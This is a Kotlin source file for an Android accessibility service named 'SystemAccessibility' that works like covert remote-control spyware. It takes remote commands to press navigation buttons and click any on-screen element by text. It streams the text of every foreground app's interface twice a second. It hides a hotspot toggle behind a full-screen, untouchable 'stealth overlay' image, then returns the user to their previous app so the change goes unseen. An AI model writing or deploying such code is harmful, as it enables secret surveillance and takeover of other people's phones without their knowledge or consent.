package com.systemlinker.features

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import android.widget.ImageView
import com.systemlinker.base.ConfigStore
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class SystemAccessibility : AccessibilityService() {

    private var isStreamingScreen = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    private var isAutomatingHotspot = false
    private var lastForegroundPackage = ""
    
    private var windowManager: WindowManager? = null
    private var stealthOverlayView: View? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private lateinit var configStore: ConfigStore

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.getStringExtra("action") ?: return
            
            when (action) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> isStreamingScreen = true
                "stream_screen_stop" -> isStreamingScreen = false
                "toggle_hotspot" -> {
                    isAutomatingHotspot = true
                    showStealthOverlay()
                    
                    val duration = configStore.overlayDurationMs
                    mainHandler.postDelayed({
                        if (isAutomatingHotspot) {
                            isAutomatingHotspot = false
                            executePostHotspotAction()
                            hideStealthOverlay()
                        }
                    }, duration)
                    
                    try {
                        val settingsIntent = Intent().apply {
                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(settingsIntent)
                    } catch (e: Exception) {
                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(fallbackIntent)
                    }
                }
                "workflow_ui" -> {
                    val targetText = intent.getStringExtra("ui_text") ?: ""
                    val targetType = intent.getStringExtra("ui_target") ?: ""
                    val targetAction = intent.getStringExtra("ui_action") ?: "click"
                    val offset = intent.getIntExtra("ui_offset", 1)
                    
                    val root = rootInActiveWindow ?: return
                    executeWorkflowUiStep(root, targetText, targetType, targetAction, offset)
                    root.recycle()
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        configStore = ConfigStore(this)

        val filter = IntentFilter("com.systemlinker.ACC_ACTION")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    // =====================================
    // DYNAMIC IMAGE OVERLAY GENERATOR
    // =====================================
    private fun showStealthOverlay() {
        mainHandler.post {
            if (stealthOverlayView != null) return@post
            
            val layout = FrameLayout(this)
            
            val imgFile = File(filesDir, "stealth_overlay.jpg")
            if (imgFile.exists()) {
                val imageView = ImageView(this).apply {
                    setImageURI(Uri.fromFile(imgFile))
                    scaleType = ImageView.ScaleType.FIT_XY // Perfect screen fit
                }
                layout.addView(imageView, FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT))
            } else {
                layout.setBackgroundColor(Color.BLACK) 
            }
            
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, 
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or       
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or       
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,      
                PixelFormat.TRANSLUCENT
            )
            
            try {
                windowManager?.addView(layout, params)
                stealthOverlayView = layout
            } catch (e: Exception) { }
        }
    }

    private fun hideStealthOverlay() {
        mainHandler.post {
            stealthOverlayView?.let { 
                try { windowManager?.removeView(it) } catch (e: Exception) { }
            }
            stealthOverlayView = null
        }
    }

    private fun executePostHotspotAction() {
        val action = configStore.postHotspotAction
        val args = configStore.postHotspotArgs
        
        if (action == "app_launch" && lastForegroundPackage.isNotEmpty()) {
            try {
                val launchIntent = packageManager.getLaunchIntentForPackage(lastForegroundPackage)
                launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
            } catch (e: Exception) { performGlobalAction(GLOBAL_ACTION_BACK) }
        } else {
            val globalAction = when (action) {
                "home" -> GLOBAL_ACTION_HOME
                "recent" -> GLOBAL_ACTION_RECENTS
                else -> GLOBAL_ACTION_BACK
            }
            for (i in 0 until args) {
                performGlobalAction(globalAction)
                Thread.sleep(200)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Track Foreground App for Return Action
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg.isNotEmpty() && pkg != "com.android.settings" && pkg != "com.systemlinker") {
                lastForegroundPackage = pkg
            }
        }

        // --- 1. HOTSPOT AUTOMATION LOGIC ---
        if (isAutomatingHotspot) {
            val rootNode = rootInActiveWindow ?: return
            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
            var clicked = false

            for (keyword in keywords) {
                val state = SearchState()
                if (dfsSequentialSearch(rootNode, keyword, state)) {
                    clicked = true
                    break
                }
            }

            if (clicked) {
                isAutomatingHotspot = false
                Thread.sleep(300) 
                executePostHotspotAction()
                hideStealthOverlay()
            }
            
            rootNode.recycle()
            return 
        }

        // --- 2. SCREEN STREAMING LOGIC ---
        if (!isStreamingScreen) return
        
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val rootNode = rootInActiveWindow ?: return
        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply {
            put("type", "live_screen")
            put("data", screenData)
        }
        
        val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
            setPackage(applicationContext.packageName)
            putExtra("json", jsonPayload.toString())
        }
        sendBroadcast(broadcast)
    }

    // =====================================
    // WORKFLOW UI AUTOMATOR
    // =====================================
    private fun executeWorkflowUiStep(node: AccessibilityNodeInfo, text: String, targetType: String, action: String, offset: Int) {
        val state = SearchState()
        dfsWorkflowSearch(node, text, targetType, action, offset, state)
    }

    private fun dfsWorkflowSearch(node: AccessibilityNodeInfo?, targetText: String, targetType: String, action: String, offset: Int, state: SearchState): Boolean {
        if (node == null) return false
        
        if (node.text?.toString()?.contains(targetText, true) == true) {
            state.recentMatch = true
            state.steps = 0
            
            // If targetType is "none", we just click the text itself
            if (targetType == "none" || targetType.isEmpty()) {
                if (node.isClickable) {
                    performUiAction(node, action)
                    return true
                }
            }
        } else if (state.recentMatch) {
            val cName = node.className?.toString()?.lowercase() ?: ""
            val matchesType = targetType.isEmpty() || cName.contains(targetType.lowercase())
            
            if (matchesType) {
                state.steps++
                if (state.steps == offset) {
                    performUiAction(node, action)
                    return true
                }
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val done = dfsWorkflowSearch(child, targetText, targetType, action, offset, state)
            child?.recycle()
            if (done) return true
        }
        return false
    }

    private fun performUiAction(node: AccessibilityNodeInfo, action: String) {
        when (action) {
            "click" -> node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            "long_click" -> node.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK)
            "scroll_forward" -> node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            "scroll_backward" -> node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
        }
    }

    // =====================================
    // CORE SEARCH UTILS
    // =====================================
    private class SearchState(var recentMatch: Boolean = false, var steps: Int = 0)

    private fun dfsSequentialSearch(node: AccessibilityNodeInfo?, targetText: String, state: SearchState): Boolean {
        if (node == null) return false
        val nodeText = node.text?.toString() ?: ""
        
        if (nodeText.contains(targetText, ignoreCase = true)) {
            state.recentMatch = true
            state.steps = 0
        } else if (state.recentMatch) {
            state.steps++
        }

        if (state.recentMatch && state.steps <= 6) {
            val cName = node.className?.toString() ?: ""
            if (cName.contains("Switch") || node.isCheckable) {
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                val p = node.parent
                if (p != null && p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val clicked = dfsSequentialSearch(child, targetText, state)
            child?.recycle() 
            if (clicked) return true
        }
        return false
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.put(dumpNode(child))
                child.recycle()
            }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }

    override fun onInterrupt() { hideStealthOverlay() }

    override fun onDestroy() {
        super.onDestroy()
        hideStealthOverlay()
        unregisterReceiver(commandReceiver)
    }
}